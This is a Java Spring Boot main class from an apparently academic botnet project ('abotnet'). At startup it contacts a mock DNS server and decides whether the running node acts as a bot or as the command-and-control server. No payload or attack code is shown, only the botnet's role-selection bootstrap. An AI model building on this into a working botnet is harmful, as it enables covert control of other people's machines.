package cs.sii.abotnet;

import java.awt.List;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Properties;

import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.http.RequestEntity;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;

import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.config.onLoad.Initialize;
import cs.sii.control.command.Commando;
import cs.sii.service.connection.NetworkService;

@SpringBootApplication
@ComponentScan("cs.sii")
@EnableJpaRepositories("cs.sii")
@EnableAsync
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class Application {

	@Autowired
	private Config configEngine;

	@Autowired
	private NetworkService nServ;

	@Autowired
	private Initialize init;

	@Autowired
	private Behavior bot;

	@Autowired
	private Commando cec;

	public static void main(String[] args) {
		SpringApplication.run(Application.class, args);

	}


	
	@Bean
	public CommandLineRunner commandLineRunner(ApplicationContext ctx) {
		return args -> {   
//			System.setProperty("javax.net.ssl.keyStoreType", "JKS");
//			System.setProperty("javax.net.ssl.trustStrore", "cacerts.jks");
			System.out.println("CARICO CONFIGURAZIONI E INFORMAZIONI DI SISTEMA");
			init.loadInfo();

			
			
			System.out.println("EFFETTUO PRIMA CONNESIONE AL DNS SERVER");


			if (nServ.firstConnectToMockServerDns()) {

				if (nServ.getCommandConquerIps().get(0).getValue1().getIp().equals(nServ.getMyIp().getIp()))
					configEngine.setCommandandconquerStatus(true);
		
				if (!configEngine.isCommandandconquerStatus()) {
					System.out.println("SONO UN BOT\n");					
					bot.initializeBot();

				} else {
					System.out.println("SONO UN CEC\n");
					cec.initializeCeC();

				}
			}

		};
	}

}